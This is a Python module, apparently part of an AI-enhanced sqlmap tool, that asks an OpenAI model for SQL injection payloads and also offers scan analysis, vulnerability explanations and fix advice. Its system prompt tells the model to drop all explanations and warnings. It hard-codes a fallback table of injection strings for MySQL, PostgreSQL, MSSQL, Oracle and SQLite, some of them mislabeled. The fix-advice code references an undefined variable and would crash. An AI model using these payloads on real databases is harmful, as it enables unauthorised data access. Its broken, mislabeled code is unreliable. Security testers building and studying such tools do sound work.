import openai
from lib.core.data import logger
from ai_module.config import get_api_key, load_config

class AICore:
    """
    AI核心类，提供AI功能的接口
    """
    
    def __init__(self):
        """
        初始化AICore类
        """
        self.config = load_config()
        self.client = None
        self._init_openai_client()
    
    def _init_openai_client(self):
        """
        初始化OpenAI客户端
        """
        config = load_config()
        api_key = get_api_key()
        
        if not api_key:
            logger.warning("未找到API密钥，AI功能将不可用")
            return
        
        # 初始化OpenAI客户端
        self.client = openai.OpenAI(
            api_key=api_key,
            base_url=config['API']['openai_api_base']
        )
    
    def check_api_key(self):
        """
        检查API密钥是否有效
        """
        api_key = get_api_key()
        return api_key is not None and len(api_key) > 0
    
    def generate_smart_payload(self, dbms, technique):
        """
        使用AI生成智能的SQL注入payload
        """
        if not self.client:
            self._init_openai_client()
            if not self.client:
                logger.error("无法初始化OpenAI客户端，使用预定义的payload")
                return self._get_fallback_payload(dbms, technique)
        
        config = load_config()
        
        # 确保dbms和technique是字符串类型
        dbms = str(dbms) if dbms is not None else "未知"
        technique = str(technique) if technique is not None else "未知"
        
        # 添加重试机制
        max_retries = int(config['API'].get('max_retries', 3))
        retry_delay = int(config['API'].get('retry_delay', 2))
        
        # 预定义一些常见的payload，作为API调用失败时的备选方案
        fallback_payload = self._get_fallback_payload(dbms, technique)
        
        for retry in range(max_retries):
            try:
                # 使用OpenAI官方库调用API
                response = self.client.chat.completions.create(
                    model=config['API']['openai_model'],
                    messages=[
                        {"role": "system", "content": "你是一个SQL注入专家，请生成有效的SQL注入payload。不要包含任何解释或警告，只返回payload本身。"},
                        {"role": "user", "content": f"生成一个 {dbms} 数据库的 SQL 注入 payload，使用 {technique} 技术。"}
                    ],
                    max_tokens=int(config['API']['openai_max_tokens']),
                    temperature=float(config['API']['openai_temperature'])
                )
                
                # 提取payload
                if response.choices and len(response.choices) > 0:
                    payload = response.choices[0].message.content.strip()
                    
                    # 过滤掉可能的解释文本，只保留payload
                    if "'" in payload or "\"" in payload or "--" in payload:
                        # 尝试提取实际的payload
                        import re
                        payload_match = re.search(r'[\'"].*?[\'"]|`.*?`|--.*', payload)
                        if payload_match:
                            payload = payload_match.group(0)
                    
                    return payload
                else:
                    logger.warning(f"API响应中没有choices: {response}")
            except Exception as e:
                # 捕获所有异常，记录错误并继续重试
                logger.warning(f"API请求异常: {str(e)}, 类型: {type(e)}, 重试中 ({retry+1}/{max_retries})...")
                
                # 在重试之前等待一段时间
                import time
                time.sleep(retry_delay * (retry + 1))  # 随着重试次数增加等待时间
        
        # 如果所有重试都失败，使用预定义的payload
        logger.warning(f"所有API请求都失败，使用预定义的payload: {fallback_payload}")
        return fallback_payload
    
    def _get_fallback_payload(self, dbms, technique):
        """
        获取预定义的payload
        """
        # 预定义一些常见的payload，作为API调用失败时的备选方案
        fallback_payloads = {
            "mysql": {
                "union": "' UNION SELECT 1,2,3,4,5-- -",
                "error": "' OR 1=1-- -",
                "blind": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,0x27,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "time": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (SELECT SUBSTRING(table_name,1,1) as current FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)x),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
            },
            "postgresql": {
                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
                "error": "' OR 1=1-- -",
                "blind": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(CAST(RANDOM() AS TEXT),CAST(RANDOM() AS TEXT)) FROM information_schema.tables GROUP BY 1)x)-- -",
                "time": "' AND (SELECT 1 FROM PG_SLEEP(5))-- -"
            },
            "mssql": {
                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
                "error": "' OR 1=1-- -",
                "blind": "' AND 1=(SELECT TOP 1 1 FROM information_schema.tables)-- -",
                "time": "' WAITFOR DELAY '0:0:5'-- -"
            },
            "oracle": {
                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM DUAL-- -",
                "error": "' OR 1=1-- -",
                "blind": "' AND 1=(SELECT 1 FROM dual)-- -",
                "time": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)-- -"
            },
            "sqlite": {
                "union": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
                "error": "' OR 1=1-- -",
                "blind": "' AND 1=(SELECT 1 FROM sqlite_master)-- -",
                "time": "' AND (SELECT 1 FROM sqlite_master LIMIT 1)-- -"
            }
        }
        
        # 如果dbms和technique都有对应的预定义payload，则获取它
        fallback_payload = None
        if dbms.lower() in fallback_payloads:
            for tech_key, payload in fallback_payloads[dbms.lower()].items():
                if tech_key in technique.lower():
                    fallback_payload = payload
                    break
            # 如果没有找到对应的technique，使用第一个可用的payload
            if fallback_payload is None and fallback_payloads[dbms.lower()]:
                fallback_payload = next(iter(fallback_payloads[dbms.lower()].values()))
        
        # 如果没有找到对应的dbms，使用MySQL的payload
        if fallback_payload is None and fallback_payloads.get("mysql"):
            fallback_payload = next(iter(fallback_payloads["mysql"].values()))
        
        # 如果仍然没有找到，使用一个通用的payload
        if fallback_payload is None:
            fallback_payload = "' OR 1=1-- -"
        
        return fallback_payload
    
    def analyze_scan_results(self, results):
        """
        使用AI分析扫描结果
        """
        if not self.client:
            self._init_openai_client()
            if not self.client:
                logger.error("无法初始化OpenAI客户端，使用预定义的分析结果")
                return "扫描发现了SQL注入漏洞。这是一个高风险漏洞，可能允许攻击者未经授权访问或修改数据库中的数据。建议立即修复此漏洞。"
        
        config = load_config()
        
        # 添加重试机制
        max_retries = int(config['API'].get('max_retries', 3))
        retry_delay = int(config['API'].get('retry_delay', 2))
        
        # 预定义的分析结果，作为API调用失败时的备选方案
        fallback_analysis = "扫描发现了SQL注入漏洞。这是一个高风险漏洞，可能允许攻击者未经授权访问或修改数据库中的数据。建议立即修复此漏洞。"
        
        for retry in range(max_retries):
            try:
                # 使用OpenAI官方库调用API
                response = self.client.chat.completions.create(
                    model=config['API']['openai_model'],
                    messages=[
                        {"role": "system", "content": "你是一个Web安全专家，请分析以下扫描结果并提供简明的总结。"},
                        {"role": "user", "content": f"分析以下 SQLMap 扫描结果：\n\n{results}\n\n总结发现的漏洞并给出风险等级。"}
                    ],
                    max_tokens=int(config['API']['openai_max_tokens']),
                    temperature=float(config['API']['openai_temperature'])
                )
                
                # 提取分析结果
                if response.choices and len(response.choices) > 0:
                    analysis = response.choices[0].message.content.strip()
                    return analysis
                else:
                    logger.warning(f"API响应中没有choices: {response}")
            except Exception as e:
                # 捕获所有异常，记录错误并继续重试
                logger.warning(f"API请求异常: {str(e)}, 类型: {type(e)}, 重试中 ({retry+1}/{max_retries})...")
                
                # 在重试之前等待一段时间
                import time
                time.sleep(retry_delay * (retry + 1))  # 随着重试次数增加等待时间
        
        # 如果所有重试都失败，使用预定义的分析结果
        logger.warning(f"所有API请求都失败，使用预定义的分析结果")
        return fallback_analysis
    
    def explain_vulnerability(self, vuln_type, dbms):
        """
        使用AI解释漏洞原理
        """
        if not self.client:
            self._init_openai_client()
            if not self.client:
                logger.error("无法初始化OpenAI客户端，使用预定义的漏洞解释")
                return "SQL注入是一种常见的Web应用程序漏洞，攻击者可以通过在用户输入中插入恶意SQL代码来操纵数据库查询。这可能导致未经授权的数据访问、数据泄露、数据损坏，甚至在某些情况下可能导致服务器被完全接管。SQL注入漏洞通常是由于应用程序没有正确验证或转义用户输入而导致的。"
        
        config = load_config()
        
        # 添加重试机制
        max_retries = int(config['API'].get('max_retries', 3))
        retry_delay = int(config['API'].get('retry_delay', 2))
        
        # 预定义的漏洞解释，作为API调用失败时的备选方案
        fallback_explanations = {
            "sql injection": "SQL注入是一种常见的Web应用程序漏洞，攻击者可以通过在用户输入中插入恶意SQL代码来操纵数据库查询。这可能导致未经授权的数据访问、数据泄露、数据损坏，甚至在某些情况下可能导致服务器被完全接管。SQL注入漏洞通常是由于应用程序没有正确验证或转义用户输入而导致的。",
            "xss": "跨站脚本（XSS）是一种Web安全漏洞，攻击者可以将恶意脚本注入到受信任的网站中。当其他用户浏览该网站时，这些恶意脚本会在他们的浏览器中执行，可能导致会话劫持、敏感信息泄露或网站内容篡改。",
            "csrf": "跨站请求伪造（CSRF）是一种攻击，迫使用户在已认证的Web应用程序中执行不需要的操作。攻击者可以诱导用户点击链接或访问网页，从而在用户不知情的情况下执行恶意操作。",
            "file inclusion": "文件包含漏洞允许攻击者包含恶意文件或执行服务器上的敏感文件。这可能导致信息泄露、远程代码执行或服务器完全被接管。"
        }
        
        # 获取预定义的漏洞解释
        fallback_explanation = None
        for key, explanation in fallback_explanations.items():
            if key in vuln_type.lower():
                fallback_explanation = explanation
                break
        
        # 如果没有找到对应的漏洞类型，使用SQL注入的解释
        if fallback_explanation is None:
            fallback_explanation = fallback_explanations.get("sql injection", "这是一个安全漏洞，可能允许攻击者未经授权访问或修改系统中的数据。建议立即修复此漏洞。")
        
        for retry in range(max_retries):
            try:
                # 使用OpenAI官方库调用API
                response = self.client.chat.completions.create(
                    model=config['API']['openai_model'],
                    messages=[
                        {"role": "system", "content": "你是一个Web安全专家，请解释以下漏洞的原理和危害。"},
                        {"role": "user", "content": f"解释 {dbms} 数据库中 {vuln_type} 类型漏洞的原理和危害。"}
                    ],
                    max_tokens=int(config['API']['openai_max_tokens']),
                    temperature=float(config['API']['openai_temperature'])
                )
                
                # 提取解释
                if response.choices and len(response.choices) > 0:
                    explanation = response.choices[0].message.content.strip()
                    return explanation
                else:
                    logger.warning(f"API响应中没有choices: {response}")
            except Exception as e:
                # 捕获所有异常，记录错误并继续重试
                logger.warning(f"API请求异常: {str(e)}, 类型: {type(e)}, 重试中 ({retry+1}/{max_retries})...")
                
                # 在重试之前等待一段时间
                import time
                time.sleep(retry_delay * (retry + 1))  # 随着重试次数增加等待时间
        
        # 如果所有重试都失败，使用预定义的漏洞解释
        logger.warning(f"所有API请求都失败，使用预定义的漏洞解释")
        return fallback_explanation
    
    def suggest_fixes(self, vuln_type, dbms, code):
        """
        使用AI提供修复建议
        """
        if not self.client:
            self._init_openai_client()
            if not self.client:
                logger.error("无法初始化OpenAI客户端，使用预定义的修复建议")
                return "为了修复SQL注入漏洞，应该使用参数化查询（预处理语句）而不是直接拼接SQL字符串。此外，还应该对用户输入进行验证，确保它符合预期的格式和类型。"
        
        config = load_config()
        
        # 添加重试机制
        max_retries = int(config['API'].get('max_retries', 3))
        retry_delay = int(config['API'].get('retry_delay', 2))
        
        # 预定义的修复建议，作为API调用失败时的备选方案
        fallback_suggestions = {
            "sql injection": "为了修复SQL注入漏洞，应该使用参数化查询（预处理语句）而不是直接拼接SQL字符串。例如，将代码从：\n\n```sql\nSELECT * FROM users WHERE id = '" + user_input + "'\n```\n\n修改为：\n\n```sql\n// 使用参数化查询\nPreparedStatement stmt = connection.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\nstmt.setString(1, user_input);\nResultSet rs = stmt.executeQuery();\n```\n\n此外，还应该对用户输入进行验证，确保它符合预期的格式和类型。",
            "xss": "为了修复XSS漏洞，应该对所有用户输入进行适当的转义或编码，特别是在将数据输出到HTML页面时。可以使用现有的安全库或框架提供的转义函数，如OWASP ESAPI或内置的HTML编码函数。",
            "csrf": "为了修复CSRF漏洞，应该在所有表单中添加CSRF令牌，并在服务器端验证这些令牌。此外，还可以使用SameSite cookie属性和检查Referer头来提供额外的保护。",
            "file inclusion": "为了修复文件包含漏洞，应该避免使用用户输入来构建文件路径。如果必须这样做，应该对用户输入进行严格的验证，只允许预定义的安全值，并使用白名单而不是黑名单来过滤输入。"
        }
        
        # 获取预定义的修复建议
        fallback_suggestion = None
        for key, suggestion in fallback_suggestions.items():
            if key in vuln_type.lower():
                fallback_suggestion = suggestion
                break
        
        # 如果没有找到对应的漏洞类型，使用SQL注入的修复建议
        if fallback_suggestion is None:
            fallback_suggestion = fallback_suggestions.get("sql injection", "为了修复此漏洞，应该对所有用户输入进行验证和转义，使用参数化查询而不是直接拼接SQL字符串，并遵循最小权限原则。")
        
        for retry in range(max_retries):
            try:
                # 使用OpenAI官方库调用API
                response = self.client.chat.completions.create(
                    model=config['API']['openai_model'],
                    messages=[
                        {"role": "system", "content": "你是一个Web安全专家，请提供修复漏洞的建议。"},
                        {"role": "user", "content": f"以下是一段存在 {vuln_type} 漏洞的 {dbms} SQL 代码：\n\n{code}\n\n请提供修复这个漏洞的建议。"}
                    ],
                    max_tokens=int(config['API']['openai_max_tokens']),
                    temperature=float(config['API']['openai_temperature'])
                )
                
                # 提取修复建议
                if response.choices and len(response.choices) > 0:
                    suggestions = response.choices[0].message.content.strip()
                    return suggestions
                else:
                    logger.warning(f"API响应中没有choices: {response}")
            except Exception as e:
                # 捕获所有异常，记录错误并继续重试
                logger.warning(f"API请求异常: {str(e)}, 类型: {type(e)}, 重试中 ({retry+1}/{max_retries})...")
                
                # 在重试之前等待一段时间
                import time
                time.sleep(retry_delay * (retry + 1))  # 随着重试次数增加等待时间
        
        # 如果所有重试都失败，使用预定义的修复建议
        logger.warning(f"所有API请求都失败，使用预定义的修复建议")
        return fallback_suggestion